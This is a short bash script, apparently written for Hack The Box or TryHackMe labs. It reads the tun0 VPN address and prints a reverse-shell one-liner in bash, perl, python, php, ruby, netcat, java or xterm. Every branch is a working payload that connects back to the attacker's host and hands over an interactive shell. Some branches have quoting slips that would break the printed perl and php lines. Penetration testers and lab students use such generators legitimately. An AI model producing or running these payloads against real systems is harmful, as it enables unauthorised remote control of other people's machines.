#!/bin/bash

#command to grep the tun0 ip(htb or thm virtual ip)

ip4=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)

#echo $ip4

# choise selection
if [ "$1" != "" ]
then
	if [ $1 == "bash" ]
	then
		echo "bash -i >& /dev/tcp/$ip4/8080 0>&1"
	
	elif [ $1 == "perl" ]
	then
		echo "perl -e 'use Socket;$i=\"$ip4\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
	elif [ $1 == "python" ]
	then
		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip4\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

	elif [ $1 == "php" ]
	then
		echo "php -r '$sock=fsockopen(\"$ip4\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

	elif [ $1 == "ruby" ]
	then	
		echo "ruby -rsocket -e'f=TCPSocket.open(\"$ip4\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

	elif [ $1 == "nc" ]
	then
		echo "nc -e /bin/sh $ip4 1234"

	elif [ $1 == "java" ]
	then
		echo "r = Runtime.getRuntime()
		p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$ip4/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])
		p.waitFor() "

	elif [ $1 == "xterm" ]
	then 
		echo "xterm -display $ip4:1 (default port:6001)"
	fi
else
		echo "enter the type of shell you want"
fi

